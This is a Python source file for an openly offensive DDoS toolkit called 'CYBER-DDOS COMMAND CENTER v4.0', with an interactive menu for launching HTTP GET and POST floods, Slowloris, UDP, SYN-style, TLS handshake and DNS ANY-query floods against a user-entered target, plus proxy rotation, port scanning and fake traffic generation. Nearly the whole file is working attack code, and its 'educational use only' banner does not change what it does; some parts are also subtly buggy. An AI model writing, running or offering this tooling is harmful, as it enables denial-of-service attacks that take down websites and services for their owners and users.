#!/usr/bin/env python3
# CYBER-DDOS COMMAND CENTER v4.0
# Created by BGZIK_CYBER - Ultimate Attack Toolkit
# WARNING: For educational purposes only

import os
import sys
import time
import random
import threading
import socket
import ssl
import requests
import json
import platform
import subprocess
import ipaddress
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin
from colorama import init, Fore, Style, Back

# Initialize colorama
init(autoreset=True)

# Global variables
ATTACK_ACTIVE = False
TOTAL_REQUESTS = 0
TOTAL_BYTES = 0
START_TIME = 0

class Colors:
    """Enhanced color class with gradients"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[35m'
    ORANGE = '\033[33m'
    PINK = '\033[95m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    
    # Background colors
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_PURPLE = '\033[45m'
    BG_CYAN = '\033[46m'

class UIUtils:
    """UI Utilities for beautiful terminal interface"""
    
    @staticmethod
    def clear_screen():
        os.system('clear' if os.name == 'posix' else 'cls')
    
    @staticmethod
    def print_banner():
        UIUtils.clear_screen()
        banner = f"""
{Colors.BG_RED}{Colors.BOLD}{' '*60}{Colors.END}
{Colors.BG_RED}{Colors.BOLD}          ╔══════════════════════════════════════════╗          {Colors.END}
{Colors.BG_RED}{Colors.BOLD}          ║        {Colors.CYAN}CYBER-DDOS COMMAND CENTER v4.0{Colors.BG_RED}{Colors.BOLD}        ║          {Colors.END}
{Colors.BG_RED}{Colors.BOLD}          ║         {Colors.YELLOW}BGZIK_CYBER ULTIMATE EDITION{Colors.BG_RED}{Colors.BOLD}         ║          {Colors.END}
{Colors.BG_RED}{Colors.BOLD}          ║    {Colors.PINK}8 Attack Methods • Proxy Support • Live Stats{Colors.BG_RED}{Colors.BOLD}   ║          {Colors.END}
{Colors.BG_RED}{Colors.BOLD}          ╚══════════════════════════════════════════╝          {Colors.END}
{Colors.BG_RED}{Colors.BOLD}{' '*60}{Colors.END}

{Colors.GREEN}[•] System: {platform.system()} {platform.release()}
{Colors.GREEN}[•] Python: {platform.python_version()}
{Colors.GREEN}[•] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{Colors.GREEN}[•] Threads: {threading.active_count()}
{Colors.RED}[!] WARNING: For educational & authorized testing only!
"""
        print(banner)
    
    @staticmethod
    def progress_bar(iteration, total, length=50):
        percent = int(100 * (iteration / float(total)))
        filled_length = int(length * iteration // total)
        bar = f"{Colors.GREEN}█" * filled_length + f"{Colors.RED}░" * (length - filled_length)
        return f"{Colors.CYAN}[{bar}{Colors.CYAN}] {percent}%"
    
    @staticmethod
    def print_table(headers, rows):
        col_widths = [max(len(str(item)) for item in col) for col in zip(headers, *rows)]
        
        # Print header
        header_str = "┌"
        for width in col_widths:
            header_str += "─" * (width + 2) + "┬"
        header_str = header_str[:-1] + "┐"
        print(Colors.CYAN + header_str)
        
        header_content = "│"
        for i, header in enumerate(headers):
            header_content += f" {Colors.YELLOW}{header:<{col_widths[i]}}{Colors.CYAN} │"
        print(header_content)
        
        # Print separator
        separator = "├"
        for width in col_widths:
            separator += "─" * (width + 2) + "┼"
        separator = separator[:-1] + "┤"
        print(separator)
        
        # Print rows
        for row in rows:
            row_content = "│"
            for i, cell in enumerate(row):
                row_content += f" {Colors.WHITE}{str(cell):<{col_widths[i]}}{Colors.CYAN} │"
            print(row_content)
        
        # Print footer
        footer = "└"
        for width in col_widths:
            footer += "─" * (width + 2) + "┴"
        footer = footer[:-1] + "┘"
        print(footer)

class AttackMethods:
    """All DDoS attack methods"""
    
    @staticmethod
    def http_flood(target_url, use_proxy=False):
        """HTTP GET Flood Attack"""
        global TOTAL_REQUESTS, TOTAL_BYTES
        
        headers = [
            {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
            {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'},
            {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)'},
            {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'},
            {'User-Agent': 'curl/7.68.0'},
        ]
        
        while ATTACK_ACTIVE:
            try:
                response = requests.get(
                    target_url,
                    headers=random.choice(headers),
                    timeout=5,
                    verify=False
                )
                TOTAL_REQUESTS += 1
                TOTAL_BYTES += len(response.content)
                return response.status_code
            except:
                pass
    
    @staticmethod
    def slowloris(target_host, target_port=80):
        """Slowloris Attack - Keep connections open"""
        while ATTACK_ACTIVE:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((target_host, target_port))
                
                # Send partial request
                sock.send(f"GET /?{random.randint(1, 9999)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {target_host}\r\n".encode())
                sock.send("User-Agent: Mozilla/5.0\r\n".encode())
                sock.send("Content-Length: 1000000\r\n".encode())
                
                # Keep alive
                while ATTACK_ACTIVE:
                    sock.send(f"X-{random.randint(1, 9999)}: {random.randint(1, 9999)}\r\n".encode())
                    time.sleep(random.uniform(10, 30))
                    
            except:
                pass
    
    @staticmethod
    def udp_flood(target_host, target_port=53, packet_size=1024):
        """UDP Flood Attack"""
        global TOTAL_REQUESTS, TOTAL_BYTES
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_to_send = random._urandom(packet_size)
        
        while ATTACK_ACTIVE:
            try:
                sock.sendto(bytes_to_send, (target_host, target_port))
                TOTAL_REQUESTS += 1
                TOTAL_BYTES += packet_size
            except:
                pass
    
    @staticmethod
    def syn_flood(target_host, target_port=80):
        """SYN Flood Attack"""
        while ATTACK_ACTIVE:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setblocking(False)
                sock.settimeout(0.5)
                sock.connect_ex((target_host, target_port))
                sock.close()
            except:
                pass
    
    @staticmethod
    def http_post_flood(target_url):
        """HTTP POST Flood with random data"""
        global TOTAL_REQUESTS
        
        while ATTACK_ACTIVE:
            try:
                data = {
                    'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=1000)),
                    'timestamp': time.time(),
                    'random': random.randint(1, 999999)
                }
                
                response = requests.post(target_url, data=data, timeout=5)
                TOTAL_REQUESTS += 1
                return response.status_code
            except:
                pass
    
    @staticmethod  
    def ssl_handshake_flood(target_host, target_port=443):
        """SSL/TLS Handshake Flood"""
        while ATTACK_ACTIVE:
            try:
                context = ssl.create_default_context()
                with socket.create_connection((target_host, target_port), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=target_host):
                        time.sleep(0.1)
            except:
                pass
    
    @staticmethod
    def dns_amplification(target_dns, target_port=53):
        """DNS Amplification Attack"""
        global TOTAL_REQUESTS, TOTAL_BYTES
        
        # DNS query for ANY record (amplification)
        dns_query = bytes.fromhex(
            "0000 0100 0001 0000 0000 0000"  # DNS header
            "0767 6f6f 676c 6503 636f 6d00"  # google.com
            "00ff 0001"                      # TYPE ANY, CLASS IN
        )
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while ATTACK_ACTIVE:
            try:
                sock.sendto(dns_query, (target_dns, target_port))
                TOTAL_REQUESTS += 1
                TOTAL_BYTES += len(dns_query)
            except:
                pass
    
    @staticmethod
    def mixed_attack(target_url, target_host, target_port=80):
        """Mixed attack - randomly chooses method"""
        methods = [
            lambda: AttackMethods.http_flood(target_url),
            lambda: AttackMethods.slowloris(target_host, target_port),
            lambda: AttackMethods.udp_flood(target_host, target_port),
            lambda: AttackMethods.http_post_flood(target_url),
        ]
        
        while ATTACK_ACTIVE:
            random.choice(methods)()
            time.sleep(random.uniform(0.01, 0.1))

class ProxyManager:
    """Proxy rotation manager"""
    
    @staticmethod
    def get_free_proxies():
        """Fetch free proxies from various sources"""
        proxy_sources = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
        ]
        
        proxies = []
        for url in proxy_sources:
            try:
                response = requests.get(url, timeout=10)
                proxies.extend([p.strip() for p in response.text.split('\n') if p.strip()])
            except:
                continue
        
        return list(set(proxies))[:100]  # Return top 100 unique proxies

class NetworkUtils:
    """Network utility functions"""
    
    @staticmethod
    def get_ip_info(ip_address):
        """Get information about IP address"""
        try:
            response = requests.get(f"http://ip-api.com/json/{ip_address}", timeout=5)
            return response.json()
        except:
            return {}
    
    @staticmethod
    def port_scan(target, ports=[80, 443, 8080, 8443]):
        """Quick port scan"""
        open_ports = []
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        return open_ports
    
    @staticmethod
    def ping_test(target, count=4):
        """Ping target"""
        param = '-n' if platform.system().lower() == 'windows' else '-c'
        command = ['ping', param, str(count), target]
        return subprocess.call(command, stdout=subprocess.DEVNULL) == 0

class DDoSAttackController:
    """Main attack controller"""
    
    def __init__(self):
        self.target_url = ""
        self.target_host = ""
        self.target_port = 80
        self.threads = 500
        self.duration = 60
        self.method = "http_flood"
        self.use_proxy = False
        self.proxies = []
        
    def parse_target(self, target):
        """Parse target URL"""
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        parsed = urlparse(target)
        self.target_url = target
        self.target_host = parsed.netloc.split(':')[0]
        
        if parsed.port:
            self.target_port = parsed.port
        elif parsed.scheme == 'https':
            self.target_port = 443
        else:
            self.target_port = 80
        
        return True
    
    def show_attack_methods(self):
        """Display available attack methods"""
        methods = [
            ["1", "HTTP Flood", "High-speed GET requests"],
            ["2", "Slowloris", "Keep connections open"],
            ["3", "UDP Flood", "UDP packet flood"],
            ["4", "SYN Flood", "SYN packet flood"],
            ["5", "HTTP POST Flood", "POST requests with data"],
            ["6", "SSL Handshake", "SSL/TLS negotiation flood"],
            ["7", "DNS Amplification", "DNS reflection attack"],
            ["8", "Mixed Attack", "Random combination"],
        ]
        
        UIUtils.print_table(["ID", "Method", "Description"], methods)
    
    def show_target_info(self):
        """Display target information"""
        try:
            print(f"\n{Colors.YELLOW}[•] Target Analysis:{Colors.END}")
            print(f"   {Colors.CYAN}URL:{Colors.WHITE} {self.target_url}")
            print(f"   {Colors.CYAN}Host:{Colors.WHITE} {self.target_host}")
            print(f"   {Colors.CYAN}Port:{Colors.WHITE} {self.target_port}")
            
            # Get IP info
            try:
                ip_info = NetworkUtils.get_ip_info(self.target_host)
                if ip_info.get('status') == 'success':
                    print(f"   {Colors.CYAN}Country:{Colors.WHITE} {ip_info.get('country', 'Unknown')}")
                    print(f"   {Colors.CYAN}ISP:{Colors.WHITE} {ip_info.get('isp', 'Unknown')}")
            except:
                pass
            
            # Port scan
            open_ports = NetworkUtils.port_scan(self.target_host)
            if open_ports:
                print(f"   {Colors.CYAN}Open Ports:{Colors.GREEN} {', '.join(map(str, open_ports))}")
            
            # Ping test
            if NetworkUtils.ping_test(self.target_host):
                print(f"   {Colors.CYAN}Ping:{Colors.GREEN} Online")
            else:
                print(f"   {Colors.CYAN}Ping:{Colors.RED} Offline")
                
        except Exception as e:
            print(f"   {Colors.RED}Error analyzing target: {e}{Colors.END}")
    
    def start_attack(self):
        """Start the DDoS attack"""
        global ATTACK_ACTIVE, TOTAL_REQUESTS, TOTAL_BYTES, START_TIME
        
        ATTACK_ACTIVE = True
        TOTAL_REQUESTS = 0
        TOTAL_BYTES = 0
        START_TIME = time.time()
        
        # Get proxies if needed
        if self.use_proxy:
            print(f"{Colors.YELLOW}[•] Fetching proxies...{Colors.END}")
            self.proxies = ProxyManager.get_free_proxies()
            print(f"{Colors.GREEN}[✓] Loaded {len(self.proxies)} proxies{Colors.END}")
        
        # Select attack method
        attack_func = None
        method_name = ""
        
        if self.method == "1" or self.method == "http_flood":
            attack_func = lambda: AttackMethods.http_flood(self.target_url, self.use_proxy)
            method_name = "HTTP Flood"
        elif self.method == "2":
            attack_func = lambda: AttackMethods.slowloris(self.target_host, self.target_port)
            method_name = "Slowloris"
        elif self.method == "3":
            attack_func = lambda: AttackMethods.udp_flood(self.target_host, self.target_port)
            method_name = "UDP Flood"
        elif self.method == "4":
            attack_func = lambda: AttackMethods.syn_flood(self.target_host, self.target_port)
            method_name = "SYN Flood"
        elif self.method == "5":
            attack_func = lambda: AttackMethods.http_post_flood(self.target_url)
            method_name = "HTTP POST Flood"
        elif self.method == "6":
            attack_func = lambda: AttackMethods.ssl_handshake_flood(self.target_host, self.target_port)
            method_name = "SSL Handshake Flood"
        elif self.method == "7":
            attack_func = lambda: AttackMethods.dns_amplification(self.target_host)
            method_name = "DNS Amplification"
        elif self.method == "8":
            attack_func = lambda: AttackMethods.mixed_attack(self.target_url, self.target_host, self.target_port)
            method_name = "Mixed Attack"
        
        print(f"\n{Colors.RED}[⚡] Starting {method_name} Attack!{Colors.END}")
        print(f"{Colors.YELLOW}[•] Threads: {self.threads}{Colors.END}")
        print(f"{Colors.YELLOW}[•] Duration: {self.duration} seconds{Colors.END}")
        print(f"{Colors.YELLOW}[•] Target: {self.target_url}{Colors.END}")
        
        # Start attack threads
        threads = []
        for i in range(self.threads):
            thread = threading.Thread(target=attack_func, name=f"Attack-Thread-{i}")
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Start monitoring thread
        monitor_thread = threading.Thread(target=self.monitor_attack)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Wait for duration
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Attack interrupted by user{Colors.END}")
        
        # Stop attack
        ATTACK_ACTIVE = False
        time.sleep(2)  # Allow threads to finish
        
        return self.generate_report()
    
    def monitor_attack(self):
        """Monitor attack in real-time"""
        global ATTACK_ACTIVE, TOTAL_REQUESTS, TOTAL_BYTES, START_TIME
        
        last_requests = 0
        last_bytes = 0
        
        while ATTACK_ACTIVE:
            try:
                elapsed = time.time() - START_TIME
                rps = (TOTAL_REQUESTS - last_requests) / 2  # Requests per 2 seconds
                bps = (TOTAL_BYTES - last_bytes) / 2        # Bytes per 2 seconds
                
                UIUtils.clear_screen()
                UIUtils.print_banner()
                
                print(f"\n{Colors.CYAN}{'═'*60}{Colors.END}")
                print(f"{Colors.YELLOW}{'ATTACK MONITOR':^60}{Colors.END}")
                print(f"{Colors.CYAN}{'═'*60}{Colors.END}")
                
                # Stats table
                stats = [
                    ["Target:", self.target_host],
                    ["Method:", self.method],
                    ["Duration:", f"{elapsed:.1f}s / {self.duration}s"],
                    ["Threads:", f"{self.threads}"],
                    ["Total Requests:", f"{TOTAL_REQUESTS:,}"],
                    ["Total Data:", f"{TOTAL_BYTES / (1024*1024):.2f} MB"],
                    ["Req/Sec:", f"{rps:.1f}"],
                    ["Data/Sec:", f"{bps / 1024:.1f} KB/s"],
                ]
                
                for label, value in stats:
                    print(f"{Colors.GREEN}{label:<20}{Colors.WHITE}{value}")
                
                # Progress bar
                progress = min(elapsed / self.duration, 1.0)
                print(f"\n{Colors.CYAN}Progress:{Colors.END}")
                print(UIUtils.progress_bar(int(progress * 100), 100))
                
                print(f"\n{Colors.RED}[!] Press Ctrl+C to stop attack{Colors.END}")
                
                last_requests = TOTAL_REQUESTS
                last_bytes = TOTAL_BYTES
                
                time.sleep(2)
                
            except Exception as e:
                print(f"{Colors.RED}Monitor error: {e}{Colors.END}")
                time.sleep(1)
    
    def generate_report(self):
        """Generate attack report"""
        global TOTAL_REQUESTS, TOTAL_BYTES, START_TIME
        
        elapsed = time.time() - START_TIME
        
        report = {
            'target': self.target_url,
            'method': self.method,
            'duration': elapsed,
            'total_requests': TOTAL_REQUESTS,
            'total_bytes': TOTAL_BYTES,
            'requests_per_second': TOTAL_REQUESTS / elapsed if elapsed > 0 else 0,
            'timestamp': datetime.now().isoformat(),
        }
        
        return report

class AdditionalTools:
    """Additional useful tools"""
    
    @staticmethod
    def stress_test_local():
        """Local stress test tool"""
        print(f"{Colors.YELLOW}[•] Starting CPU/Memory stress test...{Colors.END}")
        
        def cpu_stress():
            while True:
                [i*i for i in range(10000)]
        
        threads = []
        for i in range(os.cpu_count() * 2):
            thread = threading.Thread(target=cpu_stress)
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        input(f"{Colors.YELLOW}[!] Stress test running. Press Enter to stop...{Colors.END}")
    
    @staticmethod
    def generate_fake_traffic(url, count=1000):
        """Generate fake traffic to website"""
        print(f"{Colors.YELLOW}[•] Generating {count} fake visits to {url}{Colors.END}")
        
        for i in range(count):
            try:
                requests.get(url, timeout=2)
                print(f"{Colors.GREEN}[✓] Visit {i+1} sent{Colors.END}")
            except:
                pass
    
    @staticmethod
    def check_website_status(urls):
        """Check status of multiple websites"""
        results = []
        for url in urls:
            try:
                start = time.time()
                response = requests.get(url, timeout=5)
                latency = (time.time() - start) * 1000
                
                status = "UP" if response.status_code == 200 else "DOWN"
                results.append([url, status, response.status_code, f"{latency:.0f}ms"])
                
            except:
                results.append([url, "DOWN", "N/A", "N/A"])
        
        UIUtils.print_table(["URL", "Status", "Code", "Latency"], results)

def main_menu():
    """Main menu interface"""
    controller = DDoSAttackController()
    
    while True:
        UIUtils.print_banner()
        
        print(f"{Colors.CYAN}{'═'*60}{Colors.END}")
        print(f"{Colors.YELLOW}{'MAIN MENU':^60}{Colors.END}")
        print(f"{Colors.CYAN}{'═'*60}{Colors.END}")
        
        menu_options = [
            ["1", "🚀 DDoS Attack Panel", "Start attack on target"],
            ["2", "🔍 Target Analysis", "Analyze target information"],
            ["3", "🛠️ Attack Methods", "View all attack methods"],
            ["4", "🌐 Proxy Manager", "Manage proxy servers"],
            ["5", "📊 Network Tools", "Ping, Port Scan, etc"],
            ["6", "🧪 Additional Tools", "Stress test, fake traffic"],
            ["7", "📈 View Statistics", "View previous attack stats"],
            ["8", "⚙️ Settings", "Configure attack parameters"],
            ["9", "❌ Exit", "Exit program"],
        ]
        
        UIUtils.print_table(["ID", "Option", "Description"], menu_options)
        
        choice = input(f"\n{Colors.YELLOW}[?] Select option (1-9): {Colors.WHITE}")
        
        if choice == "1":
            start_attack_menu(controller)
        elif choice == "2":
            target_analysis_menu(controller)
        elif choice == "3":
            controller.show_attack_methods()
            input(f"\n{Colors.YELLOW}[Press Enter to continue]{Colors.END}")
        elif choice == "4":
            proxy_manager_menu()
        elif choice == "5":
            network_tools_menu()
        elif choice == "6":
            additional_tools_menu()
        elif choice == "7":
            view_statistics()
        elif choice == "8":
            settings_menu(controller)
        elif choice == "9":
            print(f"\n{Colors.GREEN}[✓] Exiting Cyber-DDoS Command Center{Colors.END}")
            sys.exit(0)
        else:
            print(f"{Colors.RED}[!] Invalid choice!{Colors.END}")
            time.sleep(1)

def start_attack_menu(controller):
    """Start attack menu"""
    UIUtils.clear_screen()
    UIUtils.print_banner()
    
    print(f"\n{Colors.RED}{'═'*60}{Colors.END}")
    print(f"{Colors.RED}{'🚀 DDoS ATTACK CONFIGURATION':^60}{Colors.END}")
    print(f"{Colors.RED}{'═'*60}{Colors.END}")
    
    # Get target
    target = input(f"\n{Colors.YELLOW}[?] Enter target URL/IP (e.g., https://example.com): {Colors.WHITE}")
    if not target:
        print(f"{Colors.RED}[!] Target is required!{Colors.END}")
        return
    
    if not controller.parse_target(target):
        print(f"{Colors.RED}[!] Invalid target URL!{Colors.END}")
        return
    
    # Show target info
    controller.show_target_info()
    
    # Get attack method
    print(f"\n{Colors.YELLOW}[?] Select attack method:{Colors.END}")
    controller.show_attack_methods()
    method = input(f"{Colors.YELLOW}[?] Enter method ID (1-8): {Colors.WHITE}")
    
    # Get threads
    try:
        threads = int(input(f"{Colors.YELLOW}[?] Number of threads (100-2000) [500]: {Colors.WHITE}") or "500")
        threads = max(100, min(threads, 2000))
    except:
        threads = 500
        print(f"{Colors.YELLOW}[!] Using default: 500 threads{Colors.END}")
    
    # Get duration
    try:
        duration = int(input(f"{Colors.YELLOW}[?] Attack duration in seconds (30-3600) [60]: {Colors.WHITE}") or "60")
        duration = max(30, min(duration, 3600))
    except:
        duration = 60
        print(f"{Colors.YELLOW}[!] Using default: 60 seconds{Colors.END}")
    
    # Use proxy?
    use_proxy = input(f"{Colors.YELLOW}[?] Use proxy rotation? (y/N): {Colors.WHITE}").lower() == 'y'
    
    # Confirm
    print(f"\n{Colors.RED}{'═'*60}{Colors.END}")
    print(f"{Colors.RED}{'ATTACK CONFIRMATION':^60}{Colors.END}")
    print(f"{Colors.RED}{'═'*60}{Colors.END}")
    
    print(f"{Colors.YELLOW}[•] Target: {Colors.WHITE}{controller.target_url}")
    print(f"{Colors.YELLOW}[•] Method: {Colors.WHITE}{method}")
    print(f"{Colors.YELLOW}[•] Threads: {Colors.WHITE}{threads}")
    print(f"{Colors.YELLOW}[•] Duration: {Colors.WHITE}{duration} seconds")
    print(f"{Colors.YELLOW}[•] Proxies: {Colors.WHITE}{'Yes' if use_proxy else 'No'}")
    
    confirm = input(f"\n{Colors.RED}[?] START ATTACK? (y/N): {Colors.WHITE}")
    
    if confirm.lower() == 'y':
        controller.method = method
        controller.threads = threads
        controller.duration = duration
        controller.use_proxy = use_proxy
        
        report = controller.start_attack()
        
        # Show results
        print(f"\n{Colors.GREEN}{'═'*60}{Colors.END}")
        print(f"{Colors.GREEN}{'ATTACK COMPLETED':^60}{Colors.END}")
        print(f"{Colors.GREEN}{'═'*60}{Colors.END}")
        
        print(f"{Colors.YELLOW}[•] Total Requests: {Colors.WHITE}{report['total_requests']:,}")
        print(f"{Colors.YELLOW}[•] Total Data Sent: {Colors.WHITE}{report['total_bytes'] / (1024*1024):.2f} MB")
        print(f"{Colors.YELLOW}[•] Requests/Second: {Colors.WHITE}{report['requests_per_second']:.1f}")
        print(f"{Colors.YELLOW}[•] Attack Duration: {Colors.WHITE}{report['duration']:.1f} seconds")
        print(f"{Colors.YELLOW}[•] Target: {Colors.WHITE}{report['target']}")
        
        # Save report
        with open('ddos_report.json', 'a') as f:
            f.write(json.dumps(report) + '\n')
        
        print(f"\n{Colors.GREEN}[✓] Report saved to ddos_report.json{Colors.END}")
        
        input(f"\n{Colors.YELLOW}[Press Enter to continue]{Colors.END}")
    else:
        print(f"{Colors.YELLOW}[!] Attack cancelled{Colors.END}")

def target_analysis_menu(controller):
    """Target analysis menu"""
    UIUtils.clear_screen()
    UIUtils.print_banner()
    
    print(f"\n{Colors.CYAN}{'🔍 TARGET ANALYSIS':^60}{Colors.END}")
    
    target = input(f"{Colors.YELLOW}[?] Enter target URL/IP to analyze: {Colors.WHITE}")
    
    if target:
        if controller.parse_target(target):
            controller.show_target_info()
        else:
            print(f"{Colors.RED}[!] Invalid target{Colors.END}")
    
    input(f"\n{Colors.YELLOW}[Press Enter to continue]{Colors.END}")

def proxy_manager_menu():
    """Proxy manager menu"""
    UIUtils.clear_screen()
    UIUtils.print_banner()
    
    print(f"\n{Colors.BLUE}{'🌐 PROXY MANAGER':^60}{Colors.END}")
    
    print(f"{Colors.YELLOW}[1] Fetch fresh proxies{Colors.END}")
    print(f"{Colors.YELLOW}[2] Test proxy speed{Colors.END}")
    print(f"{Colors.YELLOW}[3] Import custom proxies{Colors.END}")
    
    choice = input(f"\n{Colors.YELLOW}[?] Select option: {Colors.WHITE}")
    
    if choice == "1":
        print(f"{Colors.YELLOW}[•] Fetching proxies...{Colors.END}")
        proxies = ProxyManager.get_free_proxies()
        print(f"{Colors.GREEN}[✓] Found {len(proxies)} proxies{Colors.END}")
        
        with open('proxies.txt', 'w') as f:
            f.write('\n'.join(proxies))
        
        print(f"{Colors.GREEN}[✓] Saved to proxies.txt{Colors.END}")
    
    input(f"\n{Colors.YELLOW}[Press Enter to continue]{Colors.END}")

def network_tools_menu():
    """Network tools menu"""
    UIUtils.clear_screen()
    UIUtils.print_banner()
    
    print(f"\n{Colors.GREEN}{'📊 NETWORK TOOLS':^60}{Colors.END}")
    
    print(f"{Colors.YELLOW}[1] Ping host{Colors.END}")
    print(f"{Colors.YELLOW}[2] Port scan{Colors.END}")
    print(f"{Colors.YELLOW}[3] Trace route{Colors.END}")
    print(f"{Colors.YELLOW}[4] DNS lookup{Colors.END}")
    
    choice = input(f"\n{Colors.YELLOW}[?] Select option: {Colors.WHITE}")
    
    if choice == "1":
        host = input(f"{Colors.YELLOW}[?] Enter host: {Colors.WHITE}")
        if NetworkUtils.ping_test(host):
            print(f"{Colors.GREEN}[✓] Host is online{Colors.END}")
        else:
            print(f"{Colors.RED}[✗] Host is offline{Colors.END}")
    
    elif choice == "2":
        host = input(f"{Colors.YELLOW}[?] Enter host: {Colors.WHITE}")
        ports = input(f"{Colors.YELLOW}[?] Enter ports (comma separated) [80,443,8080]: {Colors.WHITE}")
        
        port_list = [int(p.strip()) for p in ports.split(',')] if ports else [80, 443, 8080]
        open_ports = NetworkUtils.port_scan(host, port_list)
        
        if open_ports:
            print(f"{Colors.GREEN}[✓] Open ports: {', '.join(map(str, open_ports))}{Colors.END}")
        else:
            print(f"{Colors.RED}[✗] No open ports found{Colors.END}")
    
    input(f"\n{Colors.YELLOW}[Press Enter to continue]{Colors.END}")

def additional_tools_menu():
    """Additional tools menu"""
    UIUtils.clear_screen()
    UIUtils.print_banner()
    
    print(f"\n{Colors.PURPLE}{'🧪 ADDITIONAL TOOLS':^60}{Colors.END}")
    
    print(f"{Colors.YELLOW}[1] CPU/Memory Stress Test{Colors.END}")
    print(f"{Colors.YELLOW}[2] Generate Fake Website Traffic{Colors.END}")
    print(f"{Colors.YELLOW}[3] Website Status Monitor{Colors.END}")
    
    choice = input(f"\n{Colors.YELLOW}[?] Select option: {Colors.WHITE}")
    
    if choice == "1":
        AdditionalTools.stress_test_local()
    elif choice == "2":
        url = input(f"{Colors.YELLOW}[?] Enter target URL: {Colors.WHITE}")
        count = input(f"{Colors.YELLOW}[?] Number of visits [1000]: {Colors.WHITE}") or "1000"
        AdditionalTools.generate_fake_traffic(url, int(count))
    
    input(f"\n{Colors.YELLOW}[Press Enter to continue]{Colors.END}")

def view_statistics():
    """View statistics"""
    UIUtils.clear_screen()
    UIUtils.print_banner()
    
    print(f"\n{Colors.YELLOW}{'📈 ATTACK STATISTICS':^60}{Colors.END}")
    
    try:
        with open('ddos_report.json', 'r') as f:
            lines = f.readlines()
        
        if not lines:
            print(f"{Colors.YELLOW}[!] No attack history found{Colors.END}")
        else:
            attacks = [json.loads(line) for line in lines[-5:]]  # Last 5 attacks
            
            rows = []
            for i, attack in enumerate(reversed(attacks), 1):
                rows.append([
                    i,
                    attack['target'][:30] + "...",
                    attack['total_requests'],
                    f"{attack['duration']:.1f}s",
                    f"{attack['requests_per_second']:.1f}/s",
                    attack['timestamp'][:19]
                ])
            
            UIUtils.print_table(["#", "Target", "Requests", "Duration", "RPS", "Time"], rows)
            
            total_requests = sum(a['total_requests'] for a in attacks)
            print(f"\n{Colors.GREEN}[•] Total requests (last 5 attacks): {total_requests:,}{Colors.END}")
            
    except FileNotFoundError:
        print(f"{Colors.YELLOW}[!] No statistics file found{Colors.END}")
    
    input(f"\n{Colors.YELLOW}[Press Enter to continue]{Colors.END}")

def settings_menu(controller):
    """Settings menu"""
    UIUtils.clear_screen()
    UIUtils.print_banner()
    
    print(f"\n{Colors.CYAN}{'⚙️ SETTINGS':^60}{Colors.END}")
    
    print(f"{Colors.YELLOW}[1] Default threads: {controller.threads}{Colors.END}")
    print(f"{Colors.YELLOW}[2] Default duration: {controller.duration}{Colors.END}")
    print(f"{Colors.YELLOW}[3] Default method: {controller.method}{Colors.END}")
    
    input(f"\n{Colors.YELLOW}[Press Enter to continue]{Colors.END}")

def check_dependencies():
    """Check and install required dependencies"""
    print(f"{Colors.YELLOW}[•] Checking dependencies...{Colors.END}")
    
    required = ['requests', 'colorama']
    missing = []
    
    for package in required:
        try:
            __import__(package.replace('-', '_'))
        except ImportError:
            missing.append(package)
    
    if missing:
        print(f"{Colors.RED}[!] Missing dependencies: {', '.join(missing)}{Colors.END}")
        print(f"{Colors.YELLOW}[•] Installing...{Colors.END}")
        
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing)
        
        print(f"{Colors.GREEN}[✓] Dependencies installed!{Colors.END}")
    
    return True

def main():
    """Main entry point"""
    try:
        # Check dependencies
        check_dependencies()
        
        # Welcome
        UIUtils.print_banner()
        
        print(f"{Colors.GREEN}[✓] All systems operational{Colors.END}")
        print(f"{Colors.GREEN}[✓] Dependencies loaded{Colors.END}")
        print(f"{Colors.GREEN}[✓] Attack modules ready{Colors.END}")
        
        time.sleep(1)
        
        # Start main menu
        main_menu()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Program interrupted{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}[!] Critical error: {e}{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    main()
